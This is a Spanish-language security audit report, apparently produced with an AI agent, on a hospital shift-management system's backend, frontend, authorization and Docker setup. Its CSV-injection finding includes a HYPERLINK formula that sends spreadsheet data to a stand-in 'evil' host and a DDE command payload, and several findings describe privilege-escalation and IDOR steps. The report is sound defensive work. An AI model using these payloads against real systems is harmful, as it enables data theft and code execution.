# Auditoría de seguridad — Sistema de Gestión de Turnos (SGT/HUAP)
## Fase 1: código, aplicación, backend, frontend, APIs, autenticación, autorización, base de datos, dependencias y Docker

**Fecha:** 2026-08-06
**Alcance:** `c:\turno2.0\Sprint3\` (repo local, remotos: `gitlab.com/lmoyag-max/sgt-2.0`, `github.com/Diego9028/Sistema-de-gestion-de-turnos-v2`, `gitlab.com/git.desarrollo.huap/innovahuap360-git` — **los 3 confirmados públicos por el cliente**)
**Modo:** Solo lectura. No se modificó código, no se rotaron credenciales, no se ejecutaron pruebas destructivas ni contra producción.
**Metodología:** OWASP ASVS 5.0 (baseline Nivel 2, con controles Nivel 3 marcados), OWASP Top 10:2025, OWASP API Security Top 10:2023, STRIDE, CWE, CVSS 4.0 (estimado cualitativamente), NIST SSDF 1.1.

---

## 0. Estado del skill de seguridad utilizado

- **Nombre:** `Security Engineer` — **Ruta:** `c:\turno2.0\engineering-security.md`
- **Leído:** completo (305 líneas). **Limitación:** no existe como comando `/security-engineer` ni como skill/agente instalado en esta sesión de Claude Code (no hay coincidencias en `~/.claude/agents`, `~/.claude/skills` ni en plugins de marketplace). Es un archivo de definición de agente suelto en la raíz del proyecto. Se aplicó manualmente como marco metodológico (mentalidad adversarial, clasificación de severidad, CWE + remediación accionable) tal como permite la instrucción original.
- Se complementó con 4 sub-auditorías especializadas de solo lectura (RBAC/IDOR, inyección/lógica de negocio, frontend, dependencias/Docker/Apache) y verificación manual directa de los hallazgos más críticos.

---

## 🚨 1. Hallazgo de prioridad inmediata (fuera de la escala de severidad normal)

### C-00 — Secretos reales expuestos en 3 repositorios Git públicos

**CWE-798 (Use of Hard-coded Credentials), CWE-540. CVSS 4.0 estimado: 9.3 Critical** (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H` — acceso de red, sin autenticación, sin interacción, compromiso total de confidencialidad/integridad/disponibilidad vía forja de JWT de administrador).

- **Verificado directamente** (no solo por el sub-agente): `git log --all -S"app.jwt.secret=HUAP..." ` y `-S"spring.datasource.password=1234"` en `c:\turno2.0\Sprint3` devuelven los commits `f830d18` y `412f547`, que contienen una clave de firma JWT literal y una contraseña de base de datos (`1234`) en texto plano dentro de `application.properties` y `JwtTokenProvider.java`.
- El `HEAD` actual está **limpio** (`app.jwt.secret=${JWT_SECRET}`, `spring.datasource.password=${DB_PASSWORD}`) — el código actual está bien, pero **el historial de Git no se limpia solo**.
- Se verificaron los 3 remotos configurados (`git remote -v`) y su accesibilidad HTTP sin autenticación: los 3 responden con contenido accesible, y **el cliente confirmó explícitamente que los 3 son públicos**.

**Impacto:** cualquier persona en Internet puede clonar cualquiera de los 3 repos, ejecutar `git log -p`, recuperar la clave JWT histórica y, si esa clave sigue vigente en algún ambiente (desarrollo, staging o producción), **forjar tokens JWT válidos con rol ADMINISTRADOR sin necesidad de credenciales ni de explotar ninguna otra vulnerabilidad**.

**Remediación (orden estricto):**
1. **Rotar ya** `JWT_SECRET` en todos los ambientes desplegados y la contraseña de BD expuesta (invalida sesiones activas; planificar ventana pero no demorar).
2. Evaluar si los 3 repos necesitan ser públicos; si no, pasarlos a privados.
3. Purgar el historial en los 3 remotos con `git filter-repo` (no `filter-branch`) y forzar push; avisar a todo colaborador con clones locales.
4. Instalar un hook `gitleaks`/`detect-secrets` en pre-commit y en CI para que esto no vuelva a ocurrir.

*(Este punto ya fue comunicado al usuario en el chat en cuanto se confirmó; se documenta aquí para que quede en el registro formal del informe.)*

---

## 2. Inventario y arquitectura

### 2.1 Stack tecnológico identificado

| Componente | Tecnología | Versión |
|---|---|---|
| Backend | Java + Spring Boot | Java 21, **Spring Boot `4.0.0-SNAPSHOT`** (parent sin fijar a GA — ver H-02) |
| Seguridad backend | Spring Security + JWT (jjwt) | jjwt 0.12.5 (api/impl/jackson), `@EnableMethodSecurity` |
| ORM / BD | Spring Data JPA / Hibernate sobre MySQL | `mysql-connector-j` (versión heredada del BOM, no fijada) |
| Documentación API | springdoc-openapi (Swagger) | 3.0.3, **deshabilitado por defecto y en producción** (`SWAGGER_ENABLED=false`) |
| Frontend | React 19 + Vite 7, Tailwind 3 | React 19.1.1, Vite 7.3.6 (resuelto), Tailwind 3.4.17 |
| Cliente HTTP frontend | axios | 1.18.1 (resuelto) |
| Routing frontend | react-router-dom (modo *Declarative*, `BrowserRouter`, NO SSR/Framework mode) | 7.18.1 (resuelto) |
| Gestor de paquetes | npm (frontend), Maven/mvnw (backend) | — |
| Autenticación | JWT stateless, Bearer en header `Authorization`, **sin cookies** | Login en dos pasos: pre-auth (5 min) → selección de servicio → JWT final (24h) |
| Contenedores | Docker multi-stage; 3 réplicas de backend + 3 de frontend detrás de Apache | `httpd:2.4-alpine` (LB), `eclipse-temurin:21-jdk-alpine` (backend), `httpd:alpine` (frontend) |
| Proxy inverso / balanceador | Apache 2.4 (`mod_proxy_balancer`) | Config versionada en `apache/` |
| Base de datos principal | MySQL — `gestionturnos` (propia del SGT, lectura/escritura) | Externa al compose, no hay contenedor MySQL |
| Base de datos externa | MySQL — `innhosp`/vista `viewPersonal` (RRHH del hospital) | **Solo lectura a nivel de datasource** (`hikari.read-only=true`, pool de 3 conexiones, entidad `@Immutable`) |
| Integraciones externas | `spring-boot-starter-mail` en `pom.xml` **pero sin uso real** (no hay `JavaMailSender` instanciado); `socket.io-client` referenciado en un archivo muerto del frontend, sin dependencia real ni uso | — |
| Exportaciones | CSV de nómina y de turnos (`ExportacionController`/`ExportacionService`), generado en memoria | Ver hallazgo C-03 (CSV injection) |
| Carga de archivos | **No existe** ningún endpoint de upload (`MultipartFile` ausente en todo el código) | n/a |
| Tareas programadas | No se detectaron `@Scheduled` ni cron jobs en el backend | n/a |

### 2.2 Diagrama textual de arquitectura y flujo de información

```
[Navegador] --HTTPS/HTTP--> [Apache LB :5173/:443]
                                   |
                    +--------------+---------------+
                    |                               |
         [frontend-1/2/3 (Apache+React est.)]  [backend-1/2/3 (Spring Boot :8080)]
                                                      |         |
                                          +-----------+         +-----------+
                                          |                                 |
                              [MySQL gestionturnos]              [MySQL innhosp / vista viewPersonal]
                              (propia del SGT, RW)                (externa del hospital, SOLO LECTURA)
```

- El JWT se emite en `backend-*` y se valida en cada instancia de forma independiente (stateless, sin sesión compartida) — correcto para escalado horizontal, **salvo por el estado en memoria de `LoginAttemptService`, que sí es por instancia** (ver H-04).
- El frontend nunca habla directo con ninguna base de datos; todo pasa por la API REST del backend.
- No hay WAF, IDS/IPS ni SIEM visibles en el repositorio (esperable — corresponde a Fase 2).

### 2.3 Fronteras de confianza y su estado real

| Frontera | Control esperado | Estado verificado |
|---|---|---|
| Navegador → Frontend | N/A (mismo origen del usuario) | Sin `dangerouslySetInnerHTML`/`eval`/`innerHTML` — superficie de XSS del lado cliente prácticamente nula |
| Frontend → Backend | Autenticación (Bearer JWT), CORS por lista blanca | Interceptor Axios centralizado ✓; CORS con orígenes exactos (sin comodines) ✓; **pero la UI decide qué mostrar en base a `localStorage` manipulable, no solo al JWT decodificado** (mitigado porque el backend es la autoridad real — salvo que el backend tampoco valida, ver C-01) |
| Backend → BD propia | Autorización a nivel de aplicación antes de cada query | **Falla sistemáticamente**: el `servicioId` del JWT nunca llega al `SecurityContext` ni se usa para autorizar (hallazgo raíz de C-01 y derivados) |
| Backend → BD externa (hospital) | Solo lectura, mínimo privilegio | **Correctamente implementado a nivel de aplicación** (`hikari.read-only=true`, pool de 3, entidad `@Immutable`, sin `hbm2ddl`). **Pendiente de verificar a nivel de usuario de BD real** (que el usuario MySQL del hospital tenga literalmente solo `GRANT SELECT` — eso vive en la configuración del motor de BD, fuera del repositorio de código, y no se pudo verificar en Fase 1; queda como requisito explícito para Fase 2 / DBA del hospital). |
| Aplicación → correo | — | No aplica: dependencia declarada pero sin uso real |
| Contenedores entre sí | Red Docker aislada, mínimo privilegio | Red dedicada con subred propia ✓; pero sin `cap_drop`, `read_only`, límites de memoria en ningún servicio (ver M-19) |
| Red interna ↔ Internet | TLS, rate limiting, WAF | **No hay TLS configurado en el repo** (ver H-04); **no hay rate limiting activo** (ver H-05); WAF es responsabilidad de Fase 2 |

**Principio aplicado en toda la revisión:** ninguna validación del frontend (ocultar botones, `ProtectedRoute`, decodificar JWT sin verificar firma) se contó como control de seguridad real. Se buscó, endpoint por endpoint, el control equivalente en el servidor.

---

## 3. Modelado de amenazas (STRIDE) — resumen

| Amenaza STRIDE | Componente | Escenario concreto verificado | Severidad | Mitigación existente | Mitigación ausente |
|---|---|---|---|---|---|
| **Spoofing** | JWT / identidad del actor | `idUsuarioAsignador`, `idReceptor`, `idFuncionario`, `idJefatura` se leen de parámetros del cliente, no del JWT, en Solicitudes/Ofertas/Turnos | **High** | JWT firmado, no falsificable en sí mismo | Los *services* no exigen que el parámetro coincida con `SecurityContext` |
| **Tampering** | `PUT /funcionarios/{id}` | Escalada a JEFATURA de otro servicio vía `servicioId`+`rol` en el payload | **Critical** | Guard parcial (bloquea cambio de `rol`/`estado` por terceros) | No valida `servicioId` contra el JWT |
| **Tampering** | Bitácora de auditoría | `POST /bitacoras` con `idEvento` existente sobrescribe (merge JPA) un evento real | **High** | Ninguna | Falta `@PreAuthorize`, falta invariante "append-only" |
| **Repudiation** | Aprobación de solicitudes | Un MEDICO puede aprobar su propia solicitud y la bitácora atribuye la acción a un `idUsuarioAsignador` arbitrario | **High** | Bitácora existe y registra eventos | No hay verificación server-side del actor real |
| **Information Disclosure** | `/funcionarios/summary`, exportaciones CSV, `/bitacoras`, `/notificaciones`, casi todos los `GET` | Cualquier autenticado (rol MEDICO) lee nómina/RUTs/bitácora completa de servicios ajenos | **High** | Requiere autenticación (no es anónimo) | Sin *scoping* por `servicioId` en ningún `GET` |
| **Information Disclosure** | Historial Git | Secreto JWT y password de BD en 3 repos públicos | **Critical** | Ninguna | Ver C-00 |
| **Denial of Service** | Login, exportaciones, API en general | Sin rate limiting en Apache (`rate_limiting.conf` 100% comentado); `LoginAttemptService` en memoria evadible con 3 réplicas | **High** | Bloqueo de 5 intentos por RUT (por instancia) | Sin límite compartido, sin límite de proxy |
| **Elevation of Privilege** | `PUT /funcionarios/{id}` | Ver C-01 | **Critical** | — | — |
| **Elevation of Privilege** | Rol MEDICO en `SecurityConfig` para aprobar solicitudes | Auto-aprobación sin segregación de funciones | **High** | — | Falta exigir `aprobador ≠ emisor` y `aprobador.servicio == recurso.servicio` |

---

## 4. Evaluación frente a OWASP ASVS 5.0 (baseline Nivel 2)

Evaluación resumida por capítulo. "✅ Cumple" / "⚠️ Parcial" / "❌ No cumple" / "N/A".

| Capítulo ASVS | Estado | Evidencia |
|---|---|---|
| V1 Encoding & Sanitization | ⚠️ Parcial | JPQL parametrizado en todo el backend ✅; CSV sin neutralizar prefijos de fórmula ❌ (C-03) |
| V2 Validation & Business Logic | ⚠️ Parcial | Locking pesimista y prevención de condiciones de carrera **excelente** ✅; Bean Validation presente en el POM pero **nunca ejecutada** (`@Valid` ausente en todos los controllers) ❌ |
| V3 Web Frontend Security | ✅ Cumple (con matices) | Sin primitivas de XSS del lado cliente; CSP aplicada en el proxy Apache (no en Spring, decisión correcta dado que ahí se sirve el HTML) |
| V4 API & Web Service | ❌ No cumple | Autorización a nivel de función y de objeto rota sistemáticamente (ver sección 6) — esto es exactamente OWASP API1 (BOLA) y API5 (BFLA) |
| V6 Authentication | ✅ Cumple en su mayoría | BCrypt(12), mitigación de timing attack con hash señuelo, bloqueo de fuerza bruta, mensajes genéricos. Gaps: bloqueo no compartido entre réplicas (⚠️), enumeración de RUT vía `/status/{rut}` (⚠️) |
| V7 Session Management | ✅ Cumple | Stateless, sin cookies, expiración de token, invalidación de sesión anterior no aplica (no hay revocación de JWT activo — aceptable dado TTL corto de 24h, pero **sin lista de revocación** para forzar logout de una cuenta comprometida — Nivel 3) |
| V8 Authorization | ❌ No cumple — **es la brecha central de todo el informe** | Ver C-01 y matriz RBAC completa (sección 6) |
| V9 Self-contained Tokens (JWT) | ✅ Cumple | Algoritmo HMAC explícito vía `Keys.hmacShaKeyFor`, sin `alg:none`, sin secreto por defecto, claims `exp`/`iat` presentes; falta `aud`/`iss`/`jti` (Nivel 3) |
| V10 OAuth/OIDC | N/A | No aplica, autenticación propia contra vista de personal del hospital |
| V11 Cryptography | ✅ Cumple | BCrypt(12) para hashes nuevos; SHA-512 legacy solo para *matches* de compatibilidad (migración documentada) |
| V12 Secure Communication | ❌ No cumple | Sin TLS configurado en el repo (H-04) |
| V13 Configuration | ⚠️ Parcial | Gestión de secretos en código actual ejemplar (sin defaults, fail-fast); pero Spring Boot en SNAPSHOT (H-02), `/server-status` expuesto (H-03) |
| V14 Data Protection | ⚠️ Parcial | `@JsonIgnore` correcto en campos de credenciales; pero exportaciones y varios `GET` filtran PII sin *scoping* por servicio |

### Controles de Nivel 3 recomendados (dado el contexto: exposición a Internet, datos de salud/RRHH, funciones privilegiadas, riesgo de alteración de turnos/asistencia)

- **V8.3 / ASVS L3** — autorización basada en atributos con verificación de pertenencia a recurso (ABAC/ReBAC) para el par usuario↔servicio, no solo RBAC por nombre de rol. Es exactamente lo que falta hoy.
- **V9 L3** — `jti` único por token + lista de revocación (Redis) para poder invalidar sesiones de una cuenta comprometida sin esperar el TTL de 24h.
- **V7 L3** — revocación activa de tokens al deshabilitar una cuenta (hoy, si se pone `estado=5` a un funcionario, su JWT ya emitido sigue siendo válido hasta que expire).
- **V17/V1 L3** — trazabilidad íntegra (WORM) de la bitácora de auditoría — hoy es reescribible (C-02 derivado).
- MFA para ADMINISTRADOR y JEFATURA — no implementado; recomendado dado que estos roles pueden alterar turnos y asistencia de todo un servicio hospitalario.

---

## 5. Hallazgos consolidados (deduplicados entre las 4 sub-auditorías + revisión directa)

### CRÍTICOS

#### C-00 — Secretos reales en historial Git público
Ver sección 1. **CVSS ~9.3.**

#### C-01 — Escalada de privilegios entre servicios vía `PUT /api/v2/funcionarios/{id}`
**CWE-639, CWE-915, CWE-269. CVSS 4.0 estimado: 9.1 Critical** (`AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L`).

- **Archivo:** [`FuncionarioController.java:232-259`](../../huap_backend/src/main/java/com/pingeso/HUAP/Controller/FuncionarioController.java) (guard) → [`FuncionarioService.java:337-409`](../../huap_backend/src/main/java/com/pingeso/HUAP/Service/FuncionarioService.java) (`updateUser`, sink en líneas 376-403).
- **Causa raíz:** `JwtTokenProvider.getServicioIdFromToken()` (`JwtTokenProvider.java:175-185`) **existe pero no se invoca en ningún punto del código** (confirmado por grep exhaustivo por el sub-agente de RBAC). El claim `servicioId` del JWT nunca llega al `SecurityContext`.
- **Explotación:** una JEFATURA (de cualquier servicio) hace `PUT /api/v2/funcionarios/{id_de_cualquier_funcionario} {"servicioId": <servicio_ajeno>, "rol": <id_rol_JEFATURA>}`. El guard del controller solo verifica que quien llama sea JEFATURA/ADMIN "en general" — no que sea JEFATURA *de ese servicio*. Con eso se auto-inserta (o inserta a un tercero) como JEFATURA de un servicio ajeno; un `switch-service` posterior emite un JWT legítimo con control total sobre ese servicio.
- **Nota de verificación:** se descartó la hipótesis de bypass por nombre de campo alternativo (`rolSistema`/`idRolSistema`) — el service nunca escribe `rolSistema`, así que **no hay escalada al rol global ADMINISTRADOR por esta vía**, solo entre servicios (que ya es crítico dado que JEFATURA controla asignación de turnos/personal de un servicio hospitalario completo).
- **Remediación:** propagar `servicioId` desde el JWT al `SecurityContext` en `JwtAuthenticationFilter`, y validar en `updateUser` que `servicioId` del payload coincide con el del caller (excepto ADMINISTRADOR).

#### C-02 — Identidad del actor tomada de parámetros del cliente, no del JWT (suplantación / repudio)
**CWE-639, CWE-807, CWE-345. CVSS 4.0 estimado: 8.7 High-Critical** (`AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:L`).

- **Archivos:** `SolicitudController.java:62,71,88` (`idReceptor`, `idUsuarioAsignador`), `OfertaGeneralController.java:44,51,59,66,76` (`idJefatura`, `idFuncionario`), `GestionTurnoService.java:64` (`idAdministrador` del body).
- **Explotación:** `PUT /api/v2/solicitudes/{id}/estado?nuevoEstado=APROBADA&idUsuarioAsignador=<id_de_una_jefatura_real>` — aprueba/rechaza solicitudes de cualquier servicio y la bitácora registra a un tercero como responsable (falsificación de auditoría en un sistema hospitalario). Mismo patrón para aceptar intercambios/ofertas "en nombre de" otro funcionario.
- **Remediación:** derivar siempre el actor de `SecurityContextHolder`, nunca de query params/body; eliminar esos parámetros del contrato de la API.

#### C-03 — Inyección de fórmulas CSV (CSV Formula Injection) en exportaciones
**CWE-1236. CVSS 4.0 estimado: 8.2 High-Critical** (requiere interacción del usuario al abrir el archivo — `UI:P` — pero el impacto puede llegar a RCE local).

- **Archivo:** [`ExportacionService.java:93-102`](../../huap_backend/src/main/java/com/pingeso/HUAP/Service/ExportacionService.java) (`valor()`).
- El escape solo cubre comillas dobles; no neutraliza `=`, `+`, `-`, `@`, tab, CR al inicio del campo. Se aplica a texto libre (`motivo` de solicitudes, nombres) que termina en el CSV descargado por Administración/Jefatura.
- **Explotación:** un MEDICO crea una solicitud con `motivo` = `=HYPERLINK("http://evil/?d="&A1&A2,"Ver")` (exfiltración sin ejecución) o un payload `=cmd|'/c ...'!A1` (ejecución si DDE está habilitado en el Excel del destinatario). Cuando la jefatura exporta y abre el CSV, se dispara.
- **Remediación:** anteponer `'` a cualquier valor que inicie con `=+-@\t\r` antes del escapado de comillas (snippet ya provisto por el sub-agente en el hallazgo original — 4 líneas de cambio).

### ALTOS

#### H-01 — Exportación y lectura masiva de datos personales sin autorización por rol ni por servicio
**CWE-862, CWE-359, CWE-770/CWE-200. CVSS ~7.5 High.**
Afecta: `GET /funcionarios/summary` (sin `servicioId` devuelve **toda la nómina del hospital**), `GET /funcionarios/disponibilidad/{servicioId}`, `GET /exportaciones/servicios/{id}/funcionarios/csv`, `GET /exportaciones/turnos/csv`, `GET /Personal/summary` (vista del hospital), `GET /bitacoras` y `/bitacoras/dto` (con RUT incluido), `GET /notificaciones` (todas), y prácticamente todos los `GET` de Turnos/Puestos/Rotativas/Planificaciones/Solicitudes — ninguno valida `servicioId` contra el JWT, porque (causa raíz común con C-01) ese claim nunca se propaga al `SecurityContext`.
**Remediación estructural única que cierra la mayoría de estos:** el mismo fix de C-01 (propagar `servicioId` al `SecurityContext`) + un componente `SeguridadServicio.exigirMismoServicio(Long)` invocado en cada *service* que recibe un `servicioId`/id de recurso desde el cliente.

#### H-02 — Módulo de Ofertas Generales sin ninguna autorización por rol
**CWE-862, CWE-639. CVSS ~7.1 High.**
`/api/v2/ofertas-generales/**` no está en ninguna lista de `SecurityConfig` ni tiene `@PreAuthorize`. Un MEDICO puede aprobar/rechazar/seleccionar postulantes de ofertas de cualquier servicio y auto-asignarse turnos remunerados. **Remediación:** añadir a `SERVICE_ADMIN_PATHS` los métodos de aprobación/selección; derivar `idJefatura`/`idFuncionario` del JWT.

#### H-03 — Bitácora de auditoría escribible y sobrescribible por cualquier usuario autenticado
**CWE-862, CWE-915, CWE-117/778. CVSS ~7.6 High.**
`POST /api/v2/bitacoras` recibe la entidad JPA cruda sin `@PreAuthorize`; al enviar un `idEvento` existente, `save()` hace `merge()` y **reescribe un evento de auditoría real**, permitiendo borrar evidencia o incriminar a terceros. **Remediación:** `@PreAuthorize("hasRole('ADMINISTRADOR')")`, DTO acotado sin `idEvento`, invariante append-only en el service.

#### H-04 — Ausencia total de rate limiting + bloqueo antifuerza bruta no compartido entre 3 réplicas
**CWE-307, CWE-770. CVSS ~7.0 High.**
`apache/conf.d/rate_limiting.conf` está 100% comentado (0 directivas activas); `locations/api.conf` igual. `LoginAttemptService` usa un `ConcurrentHashMap` por instancia — con 3 réplicas de backend, el límite efectivo de intentos se multiplica ×3 y el atacante puede rotar. Esto además deja sin freno la enumeración de `GET /funcionarios/status/{rut}` y el scraping de exportaciones (H-01). **Remediación:** mover el contador a Redis (compartido) + activar `mod_evasive`/`mod_qos` en Apache para `/login`, `/status/*`, `/exportaciones/*`.

#### H-05 — Cambio de RUT propio sin restricción → riesgo de suplantación de identidad
**CWE-639, CWE-287. CVSS ~6.8 High.**
`FuncionarioService.java:353-364` permite a cualquier usuario cambiar su propio RUT vía `PUT /funcionarios/{id}` — el guard del controller solo bloquea `rol`/`estado`, no `rut`. El RUT es la clave de correlación con la vista externa del hospital (login). **Remediación:** excluir `rut` de los campos auto-editables; requerir rol ADMINISTRADOR explícito para modificarlo.

#### H-06 — Edición/eliminación de turnos de servicios ajenos por cambio de ID en la URL
**CWE-639. CVSS ~7.3 High.**
`TurnoService.updateTurno`/`eliminarTurno` y `GestionTurnoService.alterarTurno` no comparan el servicio del turno objetivo con el servicio del caller — un SUBROGANTE de un servicio puede borrar/alterar turnos de otro servicio hospitalario completamente distinto. **Remediación:** validar `turno.servicio == JWT.servicioId` (salvo ADMINISTRADOR) antes de mutar.

#### H-07 — Rol MEDICO habilitado para aprobar solicitudes (incl. las propias) — ausencia de segregación de funciones
**CWE-863, CWE-269. CVSS ~6.5 High.**
`SecurityConfig.java:111-114` incluye `MEDICO` en los roles autorizados a `PUT /solicitudes/*/estado`. Combinado con C-02, un médico puede auto-aprobar su propia solicitud de cobertura/turno. **Remediación:** quitar `MEDICO` de esa regla; el servicio debe exigir además `aprobador ≠ emisor`.

#### H-08 — Spring Boot `4.0.0-SNAPSHOT` como parent del backend
**CWE-1104, CWE-494. Severidad operacional High** (no es un CVE en sí, pero bloquea la auditabilidad de todo lo demás).
Hace que el árbol de dependencias real (Spring Framework, Spring Security, Tomcat, mysql-connector-j) sea indeterminable estáticamente y no reproducible entre builds. **Remediación:** migrar a la última versión GA 4.0.x estable y eliminar los repositorios de snapshots del `pom.xml`.

#### H-09 — `/server-status` y `/balancer-manager` de Apache expuestos sin restricción
**CWE-200, CWE-284. CVSS ~6.9 High.**
`Require all granted` en ambas ubicaciones (`apache/conf.d/locations/health.conf`); `/balancer-manager` acepta POST para deshabilitar miembros del balanceador → DoS trivial sin autenticación, además de filtrar IPs de clientes y topología interna. **Remediación:** `Require local` / restringir a la subred del compose.

#### H-10 — Sin TLS configurado en el repositorio
**CWE-319. CVSS ~7.4 High** (tráfico incluye JWT y credenciales de login).
No hay `VirtualHost :443`, `SSLEngine` ni certificados referenciados en `apache/httpd.conf`; el puerto 443 se publica en `docker-compose.yml` pero no hay nada escuchando detrás. **Nota:** esto es simultáneamente Fase 1 (falta la config en el repo) y Fase 2 (obtención/gestión del certificado) — se documenta aquí y se repite como requisito en la sección 9.

#### H-11 (frontend) — Vector de IDOR expuesto en el cliente: fallback a `localStorage` para `servicioId`/rol
**CWE-602. CVSS ~5.4 Medium en aislamiento, pero se combina con H-01/C-01 del backend para formar una cadena de explotación completa.**
`adminService.js`, `Perfil.jsx` y otros 4 servicios caen a `localStorage.getItem('servicioId')` si el JWT decodificado no trae el dato, y ese valor se envía como query param. El frontend por sí solo no es explotable (el backend debería rechazarlo), pero **hoy el backend no lo rechaza** (H-01), por lo que esta cadena es de punta a punta. **Remediación:** eliminar los fallbacks a `localStorage`; la corrección real vive en el backend.

### MEDIOS

| # | Hallazgo | Archivo | CWE |
|---|---|---|---|
| M-01 | Bean Validation en el POM pero **cero usos de `@Valid`** en todos los controllers; DTOs anotados pero no referenciados (código muerto) | `DTO/*`, todos los `Controller/*` | CWE-20 |
| M-02 | `GlobalExceptionHandler` refleja el mensaje de cualquier `RuntimeException` al cliente, incluyendo NPEs "helpful" de Java 14+ que revelan clases/campos internos | `Config/GlobalExceptionHandler.java:34-39` | CWE-209 |
| M-03 | Lectura irrestricta de la bitácora completa del hospital (con RUT) sin filtro de servicio | `BitacoraController.java:33,82` | CWE-200 |
| M-04 | IDOR en notificaciones: leer/marcar/eliminar notificaciones de cualquier funcionario | `NotificacionController.java:20-60` | CWE-639 |
| M-05 | Lectura irrestricta de agenda/planificación/rotativas de cualquier servicio (todos los `GET` sin scoping) | Múltiples controllers | CWE-639, CWE-200 |
| M-06 | `GET /funcionarios/status/{rut}` — oráculo de enumeración de RUTs para cualquier autenticado, sin límite | `FuncionarioController.java:169-183` | CWE-203 |
| M-07 | `.env` y `.env production` del frontend versionados en Git pese al `.gitignore`; `.env production` (con espacio, no matcheado por ningún patrón) expone una IP pública real y fuerza HTTP sin TLS — verificado que **no** llega al bundle de producción actual | `sgt-huap_frontend/.env*` | CWE-540, CWE-319 |
| M-08 | PII + credencial por defecto débil (`huap2025`) hardcodeada en script de la carpeta *despliegue* (no *desarrollo*) | `BaseDatosMySQL/despliegue/setup_innhosp.sql`, `bootstrap_inicial.sql` | CWE-798, Ley 19.628 |
| M-09 | `VITE_DEBUG=true` (si se activa por error) vuelca el header `Authorization` y la contraseña de login en consola del navegador — default es `false` | `axiosConfig.js:41-46` | CWE-532 |
| M-10 | JWT y PII (`rutCompleto`, nombre, servicios) en `localStorage` — riesgo real bajo dado que no hay XSS explotable hoy, pero es el vector clásico si se introduce uno a futuro | `tokenManager.js` | CWE-522 |
| M-11 | `mod_reqtimeout` no cargado en Apache de producción (sí en `dev`) → expuesto a Slowloris | `apache/httpd.conf` | CWE-400 |
| M-12 | `X-Forwarded-For` reescrito con sintaxis incorrecta (`%{X-Forwarded-For}s` no es una variable de servidor válida) — el atacante puede falsear la IP usada por el bloqueo antifuerza bruta y los logs | `apache/conf.d/locations/api.conf:47`, `frontend.conf:38` | CWE-348, CWE-290 |
| M-13 | `ServerAlias *` + `ProxyPreserveHost On` → Host header injection si algún flujo futuro construye URLs absolutas desde `Host` (hay `spring-boot-starter-mail` en el POM aunque sin uso actual) | `apache/httpd.conf:203` | CWE-644 |
| M-14 | Imagen final del frontend corre como root, con `Options Indexes` y `AllowOverride All` duplicados sobre la config base de `httpd:alpine` | `sgt-huap_frontend/Dockerfile:28-42` | CWE-250, CWE-548 |
| M-15 | Tags de imagen Docker flotantes sin fijar por digest (`httpd:alpine` sin versión) | `docker-compose.yml`, ambos `Dockerfile` | CWE-1357 |
| M-16 | Falta `.dockerignore` en el backend (el frontend sí lo tiene) — arrastra `target/` y `huap_run.log` a la capa intermedia de build (no llega a la imagen final) | `huap_backend/` | CWE-527 |
| M-17 | Sin hardening de runtime en ningún servicio del compose: falta `read_only`, `cap_drop: [ALL]`, `no-new-privileges`, `mem_limit`/`pids_limit` | `docker-compose.yml` (los 7 servicios) | CWE-250, CWE-400 |
| M-18 | `docker-compose.dev.yml` expone el backend directo en `8080:8080` (evade el proxy y sus cabeceras) y `.env.dev` tiene `SWAGGER_ENABLED=true`, publicando el mapa completo de la API a toda la LAN | `docker-compose.dev.yml:22-23` | CWE-668 |

### BAJOS / INFORMATIVOS

- **L-01** `@PreAuthorize("hasAnyRole('ROLE_JEFATURA','ROLE_ADMINISTRADOR')")` con doble prefijo `ROLE_` → nunca se cumple (fail-closed; bug funcional, no de seguridad) — `FuncionarioController.java:390`.
- **L-02** `GET /api/v2/servicios` público sin autenticación — filtra estructura organizativa; probablemente redundante con lo que ya devuelve `/login`.
- **L-03** `PATCH` no está cubierto por ninguna regla explícita de `SecurityConfig` (hoy solo afecta a `/solicitudes/{id}/motivo`; riesgo estructural a futuro).
- **L-04** `console.log` permanente (no condicionado a `VITE_DEBUG`) con datos personales (RUT) tras cada login — `authService.js:75`.
- **L-05** `vite.config.js` con `allowedHosts: true`, `host: true`, proxy `secure: false` — solo afecta a `npm run dev`, nunca a producción.
- **L-06** `socket.js` en el frontend: código muerto, dependencia inexistente en `package.json`, sin autenticación si se reactivara — recomendar eliminar.
- **L-07** Archivos residuales versionados sin valor: `formato json.txt`, `rewrite_sanbox2.py` (frontend), carpeta `nginx/` completa marcada "histórica, no usada" en el propio README.
- **L-08** Imagen final del backend usa JDK en vez de JRE (`eclipse-temurin:21-jdk-alpine`) — mayor superficie innecesaria.
- **L-09** `LimitRequestBody` de 50 MB en Apache, generoso para una API JSON sin subida de archivos.
- **Informativo:** la CSP ya está correctamente aplicada a nivel de Apache (no en Spring) con `style-src 'unsafe-inline'` justificado por el uso de `style={{}}` inline de React, y `script-src 'self'` sin `unsafe-inline` — la preocupación inicial de incompatibilidad **se descarta** tras confirmar que la CSP vive en el proxy, no en el backend.
- **Informativo:** dependencias de frontend (axios 1.18.1, Vite 7.3.6, react-router 7.18.1, React 19.1.1) verificadas contra CVEs recientes vía búsqueda web — **ninguna aplica** a las versiones realmente resueltas por `package-lock.json` (el build usa `npm ci`, por lo que el lockfile manda). Los rangos `^` del `package.json` están desactualizados respecto al lockfile; se recomienda `npm update` del propio manifiesto para que ambos coincidan, sin que esto sea una vulnerabilidad actual.
- **Informativo:** jjwt 0.12.5 usa la API segura (`Keys.hmacShaKeyFor`); el advisory CVE-2024-31033 fue retirado (*withdrawn*) y de todas formas no aplica al patrón de uso del proyecto.

---

## 6. Matriz de autorización ROL × MÓDULO × OPERACIÓN × ALCANCE × ENDPOINT

*(Extracto priorizado; la matriz completa endpoint por endpoint —17 controllers, ~90 endpoints— fue producida durante la auditoría y puede solicitarse como anexo separado si se necesita en detalle línea por línea).*

| Módulo | Operación | Endpoint | Rol exigido hoy | Protección real | Alcance por servicio validado |
|---|---|---|---|---|---|
| Servicios / Tipos de Turno / Rotativas / Planificaciones (admin global) | Crear/Editar/Eliminar | `POST/PUT/DELETE /api/v2/{servicios,tipos-turno,rotativas,planificaciones}/**` | ADMINISTRADOR | `SecurityConfig` (`GLOBAL_ADMIN_PATHS`) | N/A (correcto, alcance global por diseño) ✅ |
